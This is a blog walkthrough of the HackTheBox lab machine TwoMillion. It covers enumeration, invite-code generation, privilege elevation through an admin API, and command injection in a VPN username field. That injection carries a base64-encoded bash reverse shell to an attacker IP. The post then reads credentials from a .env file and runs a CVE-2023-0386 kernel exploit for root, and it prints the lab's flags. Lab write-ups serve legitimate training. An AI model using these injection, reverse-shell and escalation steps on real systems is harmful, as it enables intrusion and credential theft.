---
layout: post
title: "TwoMillion Walkthrough"
date: 2024-07-28
image: ../../assets/img/Posts/TwoMillion.png
categories: [HackTheBox]
tags: [twomillion, 2million, htb, hackthebox]
---

Welcome back to yet another blog post where I will be tackling a [Twomillion](https://app.hackthebox.com/machines/TwoMillion) kinda challenge from HackTheBox. 
TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. 
The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. 
The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. 

---
## Machine Reconnaissance
We first start by performing an nmap scan on the box which will show us more information about the box.
- IP: 10.10.11.221

```bash
nmap -sC -sV -p- -vv 10.10.11.221
```
Having done the scan below are some of  the result we uncover

```bash
=========================================================================
[OS]: Linux (Ubuntu)
[Web-Technology]: nginx
[Hostname]: 2million
[IP]: 10.10.11.221
=========================================================================
[NMAP RESULTS]:
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods: 
|_  Supported Methods: OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
=========================================================================
```
----
Clearly the above show us that there are two open ports running on the box. `port 22[ssh]` and `port 80[http]`. Therefore lets perform files and directory fuzzing using the `wfuzz` tool (mind you, you can use any directory bruteforcer or fuzzing tool like gobuster, ffuf, dirbuster, feroxbuster).
But before we do that, we first add the `IP` to the `/etc/hosts` file by running the `sudo echo "10.10.11.221 2million.htb" > /etc/hosts` So that when ever we type the `2million.hbt` in our terminal or browser our local system understands that we are trying to refer to the `IP`.


### Files Fuzzing
```bash
export URL="http://2million.htb/FUZZ"
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL"
```
Below is the result for file on the website:
```bash

[Web Services Enumeration]: port 80
# Files
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                            
=====================================================================

000000001:   301        7 L      11 W       162 Ch      "index.php"                                                                                           
000000004:   301        7 L      11 W       162 Ch      "login.php"

```
These two results we obtain got me nervous and i will like to visit both and also will like to look at their `Page Source Code`.
I notice in the page source of index.php, i notice a `href` that is pointing to `http://2million.htb/invite` which got me curious. I also quickly visit the page and vview the page source of that link also.

### Directory Fuzzing
```bash
export URL="https://2million.htb/FUZZ/"
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL" 

```
Below is the result for directories on the website:
```bash
# Directories
=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================         
000000556:   200        1242 L   3326 W     64952 Ch    "views"          
000000883:   403        7 L      9 W        146 Ch      "cont

======================================================================
```
As for the directory and With the above fuzzings, There is no valueable information for us to go after.

## Code Review
>|view-source:http://2million.htb/invite
>|view-source:http://2million.htb/js/inviteapi.min.js


```javascript

<script src="[/js/htb-frontend.min.js](view-source:http://2million.htb/js/htb-frontend.min.js)"></script>
    <script defer src="[/js/inviteapi.min.js](view-source:http://2million.htb/js/inviteapi.min.js)"></script>
    <script defer>
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();
                var code = $('#code').val();
                var formData = { "code": code };
                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);
                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
    </script>
```

While reviewing the above code, I noticed that When submit button is pressed, data are  been posted to `/api/v1/invite/verify`

and i noticed the `view-source:http://2million.htb/js/inviteapi.min.js` which contain an obfuscated javascript code below.

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

I use and online javascript deobfuscator [de4js](https://lelinhtinh.github.io/de4js/)
```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

which the returns a beautified JSON dataand in the data key, it holds a rot13 encrypted data format.
```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
```
After decrypting , it return a message saying `In order to generate the invite code, make a POST request to /api/v1/invite/generate` which clearly tell us what to do.
```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MFVKU0ctM1gwMkwtTlNSNkgtMEVENE4=",
    "format": "encoded"
  }
}

```

```bash
echo "MFVKU0ctM1gwMkwtTlNSNkgtMEVENE4=" | base64 -d
```

> Invitation Code generated above
- 0UJSG-3X02L-NSR6H-0ED4N

I used the above invitation code to register for an account at `2million.htb/invite` which redirects me to login after successfully created an account using the invitation code.

![[../../assets/img/Posts/2million_dashboard.png]]
upon looking at the box, i navigate to the tabs and luckily i came across the `access tab`


```bash
curl -sv POST http://2million.htb/api/v1/user/vpn/generate

curl -sv http://2million.htb/api --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" | jq

curl -sv http://2million.htb/api/v1 --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" | jq
```

![[Pasted image 20240727183154.png]]

```bash
curl -sv http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" | jq

curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" 

curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" | jq


curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" --header "Content-Type: application/json" --data '{"email":"test@2million.htb"}' | jq

curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": 1}' | jq

 curl -sv http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" | jq

# This generate the vpn file config.
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" --header "Content-Type: application/json" --data '{"username":"test"}' 

# Code Injection
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" --header "Content-Type: application/json" --data '{"username":"test;id;"}'

# Shell
nc -lnvp 9999 #locally

curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4rok35tn2reghrp6o4aa4vt8cj" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzUvOTk5OSAwPiYxCg== | base64 -d | bash;"}'


```

## Lateral Movement

```bash
ls -la
cat .env
```

![[Pasted image 20240727185952.png]]

-> Upon securing the `DB_PASSWD=SuperDuperPass123` I tried accessing the machine via `ssh` 

```bash
ssh admin@2million.htb
# PAssword: SuperDuperPass123
```

# Privilege Escalation

```bash 
ls -la /var/mail
cat admin
uname -a
lsb_release -a

```

![[Pasted image 20240727220226.png]]

```bash
#Locally
git clone https://github.com/xkaneiki/CVE-2023-0386

zip -r cve.zip CVE-2023-0386
scp cve.zip admin@2million.htb:/tmp

# Remote
cd /tmp
ls unzip cve.zip
cd CVE-2023-0386
make all

./fuse ./ovlcap/lower ./gc &
./exp
id
cat /root/root.txt


```
# Credentials
`user.txt: 7caf6adb13597f1c95ddc8215b3ec488`

`root.txt: 207e1f55d619396700f85b66747cd1ae`
# Post Root
```bash
cat /root/thank_you.json
```

```json
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}

// URL Decoded
{"encoding": "url", "data": "{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}"}

// From Hex Decode

Ú

Ú
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}

```

```
Dear HackTheBox Community,
We are thrilled to announce a momentous milestone in our journey together. With immense
joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users!
This incredible feat would not have been possible without each and every one of you.
From the very beginning, HackTheBox has been built upon the belief that knowledge
sharing, collaboration, and hands-on experience are fundamental to personal and
professional growth. Together, we have fostered an environment where innovation thrives
and skills are honed. Each challenge completed, each machine conquered, and every skill
learned has contributed to the collective intelligence that fuels this vibrant
community.
To each and every member of the HackTheBox community, thank you for being a part of
this incredible journey. Your contributions have shaped the very fabric of our platform
and inspired us to continually innovate and evolve. We are immensely proud of what we
have accomplished together, and we eagerly anticipate the countless milestones yet to
come.
Here's to the next chapter, where we will continue to push the boundaries of
cybersecurity, inspire the next generation of ethical hackers, and create a world where
knowledge is accessible to all.
With deepest gratitude,
The HackTheBox Team
```


